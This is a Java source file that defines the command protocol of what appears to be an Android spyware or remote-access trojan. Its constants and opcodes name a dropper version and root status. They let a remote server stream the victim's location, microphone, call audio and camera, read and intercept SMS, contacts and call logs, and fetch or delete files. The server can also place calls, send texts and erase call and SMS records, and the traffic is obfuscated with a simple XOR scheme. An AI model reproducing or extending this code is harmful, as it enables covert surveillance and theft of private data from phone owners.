package sub.app.entry;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.zip.GZIPOutputStream;

import sub.app.client.Packet;

import main.app.loan.NetServer;


public class Protocol {

	
//	public static boolean SYSTEM_APP_VERSION = false;
//	public static final String ROOT_TASK_SERVICE = "com.app.core.Task";
//	public static final String SysApkName = "SecPack.apk";
	public static int DropperVer = 2; 	//0, 1, 2
	public static int PRODUCT_ID = 202;	//100, 200
	
	public static int IS_ROOTED_APP = 0;		//1:root ok, 0:root fail
	public static int IsAliveVersion = 1;		//1:alive, 2:timeout

	
	public static final int SERVER_ASYNC_PORT = 5980;
	
	public static final int SERVER_SERIAL_PORT = 5981;

	public final static int MAX_KEEPALIVE_MSSEC = 5 * 60 * 1000;

	public final static int SEND_KEEPALIVE_PREIOD = 45 * 1000;

	public final static int PACKET_HEADER_SIZE = 67; //Op[1]|UID[4]|Chan[4]|CmdNo[4]|DevID[50]|DataLen[4]
	public final static int MAX_PACKET_SIZE = 2048;
	public final static int MAX_BUFFER_SIZE = (MAX_PACKET_SIZE - PACKET_HEADER_SIZE) * 50;
	
	public final static byte CONST_COMMON_OP = 0;

	public final static byte OPCOMM_DEBUG = CONST_COMMON_OP + 1;
	public final static byte OPCOMM_ERROR = CONST_COMMON_OP + 2;
	public final static byte OPCOMM_INFOS = CONST_COMMON_OP + 3;
	public final static byte OPCOMM_CONNECT = CONST_COMMON_OP + 4;
	public final static byte OPCOMM_DISCONNECT = CONST_COMMON_OP + 5;

	public final static byte CONST_SERVER_OP = 30;
	
	public final static byte OPSERVER_GET_GPS = CONST_SERVER_OP + 0;
	public final static byte OPSERVER_GET_GPS_STREAM = CONST_SERVER_OP + 1;
	public final static byte OPSERVER_STOP_GPS_STREAM = CONST_SERVER_OP + 2;
	
	public final static byte OPSERVER_GET_PICTURE = CONST_SERVER_OP + 3;
	
	public final static byte OPSERVER_GET_SOUND_STREAM = CONST_SERVER_OP + 4;
	public final static byte OPSERVER_STOP_SOUND_STREAM = CONST_SERVER_OP + 5;
	
	public final static byte OPSERVER_GET_VIDEO_STREAM = CONST_SERVER_OP + 6;
	public final static byte OPSERVER_STOP_VIDEO_STREAM = CONST_SERVER_OP + 7;
	
	public final static byte OPSERVER_GET_BASIC_INFO = CONST_SERVER_OP + 8;
	public final static byte OPSERVER_DO_TOAST  = CONST_SERVER_OP + 9;
	public final static byte OPSERVER_MONITOR_SMS = CONST_SERVER_OP + 10;
	public final static byte OPSERVER_MONITOR_CALL = CONST_SERVER_OP + 11;
	public final static byte OPSERVER_GET_CONTACTS = CONST_SERVER_OP + 12;
	public final static byte OPSERVER_GET_SMS = CONST_SERVER_OP + 13;
	public final static byte OPSERVER_LIST_DIR = CONST_SERVER_OP + 14;
	public final static byte OPSERVER_GET_FILE = CONST_SERVER_OP + 15;
	public final static byte OPSERVER_GIVE_CALL = CONST_SERVER_OP + 16;
	public final static byte OPSERVER_SEND_SMS = CONST_SERVER_OP + 17;
	public final static byte OPSERVER_GET_CALL_LOGS = CONST_SERVER_OP + 18;
	public final static byte OPSERVER_STOP_MONITOR_SMS = CONST_SERVER_OP + 19;
	public final static byte OPSERVER_STOP_MONITOR_CALL = CONST_SERVER_OP + 20;
	public final static byte OPSERVER_GET_ADV_INFORMATIONS = CONST_SERVER_OP + 21;
	public final static byte OPSERVER_OPEN_BROWSER = CONST_SERVER_OP + 22;
	public final static byte OPSERVER_DO_VIBRATE = CONST_SERVER_OP + 23;
	public final static byte OPSERVER_DBDEL_CALLSMS = CONST_SERVER_OP + 24;
	public final static byte OPSERVER_DEL_FILE = CONST_SERVER_OP + 25;
	public final static byte OPSERVER_SIM_GPS_POINT = CONST_SERVER_OP + 26;
	public final static byte OPSERVER_SET_CONFIG	= CONST_SERVER_OP + 27;
	public final static byte OPSERVER_GET_CONFIG	= CONST_SERVER_OP + 28;
	
	public final static byte OPSERVER_STOPALL = CONST_SERVER_OP + 30;

	public final static byte CONST_CLIENT_OP = 80;

	public final static byte OPCLIENT_GPS = CONST_CLIENT_OP + 0;
	public final static byte OPCLIENT_GPS_FILE = CONST_CLIENT_OP + 1;
	public final static byte OPCLIENT_PICTURE = CONST_CLIENT_OP + 2;
	public final static byte OPCLIENT_SOUND_STREAM = CONST_CLIENT_OP + 3;
	public final static byte OPCLIENT_VIDEO_STREAM = CONST_CLIENT_OP + 4;
	public final static byte OPCLIENT_BASIC_INFO = CONST_CLIENT_OP + 5;
	public final static byte OPCLIENT_TOAST = CONST_CLIENT_OP + 6;
	public final static byte OPCLIENT_MONITOR_SMS = CONST_CLIENT_OP + 7;
	public final static byte OPCLIENT_MONITOR_CALL = CONST_CLIENT_OP + 8;
	public final static byte OPCLIENT_CONTACTS = CONST_CLIENT_OP + 9;
	public final static byte OPCLIENT_SMS1 = CONST_CLIENT_OP + 10;
	public final static byte OPCLIENT_LIST_DIR1 = CONST_CLIENT_OP + 11;
	public final static byte OPCLIENT_FILE = CONST_CLIENT_OP + 12;
	public final static byte OPCLIENT_GIVE_CALL = CONST_CLIENT_OP + 13;
	public final static byte OPCLIENT_SEND_SMS = CONST_CLIENT_OP + 14;
	public final static byte OPCLIENT_CALL_LOGS1 = CONST_CLIENT_OP + 15;
	public final static byte OPCLIENT_KEEPALIVE = CONST_CLIENT_OP + 16;
	public final static byte OPCLIENT_DCIM = CONST_CLIENT_OP + 17;
	public final static byte OPCLIENT_RECFILE = CONST_CLIENT_OP + 18;

	public final static byte OPCLIENT_SMS = CONST_CLIENT_OP + 19;
	public final static byte OPCLIENT_CALL_LOGS = CONST_CLIENT_OP + 20;
	public final static byte OPCLIENT_LIST_DIR = CONST_CLIENT_OP + 21;

	public final static byte OPCLIENT_STATUS = CONST_CLIENT_OP + 22;

	public final static int ARG_STREAM_AUDIO_MIC = 1; 
	public final static int ARG_STREAM_AUDIO_UPDOWN_CALL = 4; 
	public final static int ARG_STREAM_AUDIO_UP_CALL = 2; 
	public final static int ARG_STREAM_AUDIO_DOWN_CALL = 3; 
	
	public final static String KEY_SEND_SMS_NUMBER = "number";
	public final static String KEY_SEND_SMS_BODY = "body";
	
	public static final int STATUS_TYPE_NONE = 0;
	
	public static final int STATUS_TYPE_FTPFILE = 1;
	public static final int STATUS_TYPE_FTPPHOTO = 2;
	public static final int STATUS_TYPE_FTPDIR = 3;
	public static final int STATUS_TYPE_FTPCALL = 4;
	public static final int STATUS_TYPE_FTPSMS = 5;
	
	public static final int STATUS_RESULT_FAIL = 0;
	public static final int STATUS_RESULT_SUCCESS = 1;

	public static void DecryptPacketPhone(byte[] pbData)
	{
		try{
			if (pbData == null || pbData.length <= 0)
			{
				return;
			}
			
			int nLen = pbData.length;
			for(int i = 0; i < nLen; i++)
			{
				pbData[i] ^= (byte)(0xC3+(i & 0xD6));
			}
		}
		catch(Exception e)
		{
			
		}
	}

	public static void EncryptPacketPhone(byte[] pbData)
	{
		try{
			int nLen = pbData.length;
			for(int i = 0; i < nLen; i++)
			{
				pbData[i] ^= (byte)(0xC3+(i & 0xD6));
			}
		}
		catch(Exception e)
		{
			
		}
	}

	public static void EncryptPacketPhone(byte[] pbData, int offset)
	{
		try{
			int nLen = pbData.length;
			for(int i = 0; i < nLen; i++)
			{
				pbData[i] ^= (byte)(0xC3+((i + offset) & 0xD6));
			}
		}
		catch(Exception e)
		{
			
		}
	}

	public static byte[] compress(byte[] raw)
	{
		try{
			if(raw == null || raw.length <= 0) return null;
		    ByteArrayOutputStream os = new ByteArrayOutputStream(raw.length);
		    GZIPOutputStream gos = new GZIPOutputStream(os);
		    gos.write(raw);
		    gos.close();
		    byte[] compressed = os.toByteArray();
		    os.close();
		    return compressed;
		}
		catch(Exception e)
		{
		}
		return null;
	}

	//Op[1]|DevID[4]|Chan[4]|CmdNo[4]|DevID[50]|DataLen[4]|Data
	
	public static byte[] MakeHeader(byte nOpcode, int nDevID, String szDevID, int nChannel, int nCmdNo, int dataLen)
	{
		try{
			//
			int nDataLen = dataLen;
			
	        byte[] byPacket = new byte[PACKET_HEADER_SIZE];
	        Arrays.fill(byPacket, (byte)0);

	        //
	        int nOffset =0;
	        byte[] temp = null;
	        
	        byPacket[0] = nOpcode;
	        nOffset+=1;

	        temp = CTypeCast.Int2Bytes(nDevID);
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=4;

	        temp = CTypeCast.Int2Bytes(nChannel);
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=4;

	        temp = CTypeCast.Int2Bytes(nCmdNo);
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=4;
	        
	        temp = szDevID.getBytes("UTF8");
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=50;

	        temp = CTypeCast.Int2Bytes(nDataLen);
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=4;
	
	        return byPacket;
		}
		catch(Exception e)
		{
			
		}
		return null;
	}	
	
	public static byte[] MakePacket(byte nOpcode, int nDevID, String szDevID, int nChannel, int nCmdNo, byte[] data)
	{
		try{
			//
			int nDataLen = 0;
			if(data != null)
			{
				nDataLen = data.length;
			}
			
	        byte[] byPacket = new byte[PACKET_HEADER_SIZE + nDataLen];
	        Arrays.fill(byPacket, (byte)0);

	        //
	        int nOffset =0;
	        byte[] temp = null;
	        
	        byPacket[0] = nOpcode;
	        nOffset+=1;

	        temp = CTypeCast.Int2Bytes(nDevID);
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=4;

	        temp = CTypeCast.Int2Bytes(nChannel);
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=4;

	        temp = CTypeCast.Int2Bytes(nCmdNo);
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=4;
	        
	        temp = szDevID.getBytes("UTF8");
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=50;

	        temp = CTypeCast.Int2Bytes(nDataLen);
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=4;
	
	        //
	        if(nDataLen > 0 && data != null)
	        {
		        byte[] encBody = new byte[nDataLen];
		        Arrays.fill(encBody, (byte)0);

		        System.arraycopy(data, 0, encBody, 0, data.length);
		        
		        EncryptPacketPhone(encBody);
		        System.arraycopy(encBody, 0, byPacket, nOffset, encBody.length);
	        }
	
	        return byPacket;
		}
		catch(Exception e)
		{
			
		}
		return null;
	}
	
	public static byte[] build_PacketList(ArrayList list) {
		try {
			int nLength = 0;
			for (int i = 0 ; i < list.size(); i++)
			{
				Object obj = list.get(i);
				nLength = nLength + ((Packet)obj).getBodySize();
			}
			
			CTypeCast result = CTypeCast.allocate(nLength + 4);
			
			int nCount = list.size();
			result.putInt(nCount);

			for (int i = 0 ; i < nCount; i++)
			{
				Object obj = list.get(i);
				byte[] element = ((Packet)obj).build();
				result.append(element);
			}
			
			return result.toPtr();
			
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}
	
	public static String getServerIP()
	{
		return NetServer.getServerIP();
	}	
}

